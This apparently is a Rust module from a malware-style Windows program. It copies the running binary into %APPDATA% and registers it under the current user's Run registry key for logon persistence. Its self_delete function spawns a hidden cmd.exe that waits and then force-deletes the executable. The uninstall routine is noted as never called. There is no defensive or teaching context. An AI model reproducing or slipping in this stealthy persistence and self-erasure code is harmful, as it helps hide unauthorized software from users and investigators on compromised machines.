use std::fs;
use std::os::windows::process::CommandExt;
use std::path::PathBuf;

use winreg::enums::{HKEY_CURRENT_USER, KEY_SET_VALUE};
use winreg::RegKey;

use crate::util;

const RUN_KEY: &str = r"Software\Microsoft\Windows\CurrentVersion\Run";
const CREATE_NO_WINDOW: u32 = 0x0800_0000;

pub fn install_dir(app_name: &str) -> Option<PathBuf> {
    util::env_path("APPDATA").map(|base| base.join(app_name))
}

/// Copies the running binary next to the user's app data and registers it for
/// logon. Returns false when the copy or the registry write fails.
pub fn install(app_name: &str) -> bool {
    let Ok(exe) = std::env::current_exe() else {
        return false;
    };
    let Some(dir) = install_dir(app_name) else {
        return false;
    };
    let _ = fs::create_dir_all(&dir);
    let target = dir.join(format!("{app_name}.exe"));

    if exe != target {
        let _ = fs::copy(&exe, &target);
    }

    let command = format!("\"{}\"", target.to_string_lossy());
    let Ok(key) = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags(RUN_KEY, KEY_SET_VALUE)
    else {
        return false;
    };
    key.set_value(app_name, &command).is_ok()
}

/// Removes the Run value and the `%APPDATA%` copy. Kept for the manual cleanup
/// path; nothing in the run calls it.
#[allow(dead_code)]
pub fn uninstall(app_name: &str) {
    if let Ok(key) = RegKey::predef(HKEY_CURRENT_USER).open_subkey_with_flags(RUN_KEY, KEY_SET_VALUE) {
        let _ = key.delete_value(app_name);
    }
    if let Some(dir) = install_dir(app_name) {
        let _ = fs::remove_dir_all(dir);
    }
}

/// Removes the binary after the process exits. The short ping keeps cmd alive
/// long enough for the image lock to be released.
pub fn self_delete() {
    let Ok(exe) = std::env::current_exe() else {
        return;
    };
    let path = exe.to_string_lossy().into_owned();
    let script = format!("ping -n 4 127.0.0.1 >nul & del /f /q \"{path}\"");
    let _ = std::process::Command::new("cmd.exe")
        .args(["/c", &script])
        .creation_flags(CREATE_NO_WINDOW)
        .spawn();
}
